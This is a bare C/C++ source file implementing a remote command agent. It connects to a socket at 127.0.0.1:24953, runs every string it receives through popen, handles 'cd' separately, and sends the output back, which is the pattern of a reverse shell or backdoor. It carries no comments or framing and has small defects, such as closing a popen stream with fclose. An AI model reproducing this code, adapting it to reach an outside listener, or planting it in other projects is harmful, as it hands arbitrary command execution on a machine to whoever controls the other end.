#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/dir.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

const int max = 10000;

char *buf;

void clearBuf() {
    for (int i = 0; i <= max; i++)
        buf[i] = 0;
}

int main() {
    int mainSocket = socket(AF_INET, SOCK_STREAM, 0);
    buf = (new char[max + 2]) + 1;

    sockaddr addr;
    addr.sa_family = AF_INET;
    *((unsigned short*)&addr + 1) = htons(24953);
    *((int*)&addr + 1) = htonl(inet_network("127.0.0.1"));

    printf("%d\n", connect(mainSocket, &addr, sizeof(addr)));
    while (true) {
        for (int i = 0; i < max; i++)
            buf[i] = 0;

        if (recv(mainSocket, buf, max, 0) == 0)
            break;

        if (buf[0] == 'c' && buf[1] == 'd' && buf[2] == ' ') {
            chdir(buf + 3);
            getcwd(buf, max);
            buf[strlen(buf)] = '\n';
            buf[-1] = 'D';
            send(mainSocket, buf - 1, strlen(buf) + 1, 0);
        } else {
            FILE *out = popen(buf, "r");
            buf[-1] = 'O';
            while (fgets(buf, max, out) != NULL)
                send(mainSocket, buf - 1, strlen(buf) + 1, 0);

            fclose(out);
        }
    }

    return 0;
}
